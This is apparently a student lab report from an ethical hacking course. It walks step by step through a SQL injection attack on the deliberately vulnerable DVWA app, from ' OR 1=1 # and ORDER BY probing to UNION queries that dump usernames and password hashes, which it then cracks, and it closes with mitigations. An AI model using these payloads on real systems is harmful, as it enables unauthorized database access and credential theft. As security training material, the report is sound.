**Student Name:** Tawanda Alfred Machanyangwa  
**Course:** Cisco with Paro Cyber Ethical Hacking  
**Date:** 18 Jan 2026  
**Instructor:** Ronald Mawuli  

## Lab -- SQL Injection Attacks

⚠️ **IMPORTANT DISCLAIMER**  
*This lab was conducted in a controlled virtual lab environment using intentionally vulnerable software (DVWA) for educational purposes only. All activities described in this document should ONLY be performed in authorized lab environments with proper permission. Unauthorized testing of websites or applications is illegal and unethical.*

---

### Objective
This lab walks you through the process of exploiting a SQL injection vulnerability in a web application using DVWA (Damn Vulnerable Web Application) hosted on a KALI Linux VM specifically configured for the CISCO Ethical Hacking Course. You will learn how to test for SQL injection, extract database information, and retrieve sensitive data like usernames and passwords.

---

### Part 1: Exploit an SQL Injection Vulnerability on DVWA

#### Step 1: Prepare DVWA for SQL Injection Exploit
1. Open your browser and navigate to:  
   **[http://10.6.6.13](http://10.6.6.13/)**
2. Log in with the default credentials:
   - **Username:** `admin`
   - **Password:** `password`
3. Set the DVWA security level to **Low**:
   - Click **DVWA Security** in the left menu.
   - Change the security level to **Low** and click **Submit**.

#### Step 2: Check for SQL Injection Vulnerability
1. Click **SQL Injection** in the left menu.
2. In the **User ID** field, enter:  
   `' OR 1=1 #`
3. Click **Submit**.

**Expected Output:**  
You should see a list of all users in the database. This confirms that the application is vulnerable to SQL injection. The query `' OR 1=1 #` makes the SQL statement always true, returning all records.

> *Note: The previous lesson we were able to run some malicious queries to get data from the database. We were able to get all the users, the database version, and even the passwords.*

#### Step 3: Determine the Number of Fields in the Query
To understand the structure of the SQL query, we use `ORDER BY`:
1. Enter: `1' ORDER BY 1 #` → Works.
2. Enter: `1' ORDER BY 2 #` → Works.
3. Enter: `1' ORDER BY 3 #` → Error: *"Unknown column '3' in 'order clause'."*

**Conclusion:** The query uses **2 fields**.

#### Step 4: Check Database Management System (DBMS) Version
1. Enter:  
   `1' OR 1=1 UNION SELECT 1, VERSION() #`
2. Click **Submit**.

**Expected Output:**  
At the end of the list, you should see something like:
First name: 1
Surname: 5.5.58-0+deb8u1

text

This means the DBMS is **MySQL version 5.5.58**.

#### Step 5: Determine the Database Name
1. Enter:  
   `1' OR 1=1 UNION SELECT 1, DATABASE() #`
2. Click **Submit**.

**Expected Output:**
First name: 1
Surname: dvwa

text

The database name is **dvwa**.

#### Step 6: Retrieve Table Names from the dvwa Database
1. Enter:
1' OR 1=1 UNION SELECT 1, table_name
FROM information_schema.tables
WHERE table_type='base table' AND table_schema='dvwa' #

text

2. Click **Submit**.

**Tables Found:**
- `guestbook`
- `users`

> *Question: Which table do you think is the most interesting for a penetration test?*  
> *Answer: The users table, because it may include usernames and passwords.*

#### Step 7: Retrieve Column Names from the users Table
1. Enter:
1' OR 1=1 UNION SELECT 1, column_name
FROM information_schema.columns
WHERE table_name='users' #

text

2. Click **Submit**.

**Columns Found (of interest):**
- `user`
- `password`

These are the most valuable columns for a penetration test because they contain login credentials.

#### Step 8: Retrieve User Credentials
1. Enter:  
`1' OR 1=1 UNION SELECT user, password FROM users #`
2. Click **Submit**.

**Output:**  
You will see a list of usernames and their corresponding password hashes.

#### Step 9: Crack the Password Hashes
1. Copy one of the hashes (e.g., for the user `admin`).
2. Go to **[https://crackstation.net](https://crackstation.net/)**.
3. Paste the hash and click **Crack Hashes**.

**Results:**
- `admin` → `password`
- `pablo` → `letmein`

> *Note: We were also able to crack some of the passwords and then we ended it there.*

---

### Part 2: Reflection & Mitigation

#### What Did We Learn?
SQL injection is a critical web vulnerability that allows attackers to:
- Extract sensitive data from databases.
- Bypass authentication.
- Execute arbitrary SQL commands.

#### How Can We Prevent SQL Injection?
From the class discussion and research, here are key mitigation strategies:

1. **Use Prepared Statements (Parameterized Queries)** – This ensures user input is treated as data, not executable SQL.
2. **Input Validation & Sanitization** – Validate and filter all user inputs to reject malicious payloads.
3. **Escape User Inputs** – Properly escape special characters in user-supplied data.
4. **Limit Database Privileges** – Ensure the application database user has the least privileges necessary.
5. **Use Web Application Firewalls (WAFs)** – Implement WAFs to detect and block SQL injection attempts.

> *Note: If you don't set proper validation, it's going to allow the browser to guess the type of file you're sending to the server—and that's dangerous.*

---

### Final Thoughts
This lab demonstrated how easily an unprotected web application can be exploited using SQL injection. As aspiring cybersecurity professionals, it's essential to understand both how these attacks work and how to defend against them.

**Remember:**
- Always test your own applications for vulnerabilities and follow secure coding practices.
- **NEVER** perform these tests on systems you do not own or have explicit permission to test.
- These techniques are for **educational purposes only** in controlled lab environments.

Lab Completed. *Feel free to revisit the steps and experiment with different payloads in DVWA's **Medium** and **High** security modes to see how filtering and validation can be bypassed—always within your authorized lab environment.*

---

**DISCLAIMER: EDUCATIONAL USE ONLY**  
*This document and the techniques described herein are intended solely for educational purposes in controlled, authorized environments. Unauthorized use of these techniques against any system is illegal and violates ethical standards.*
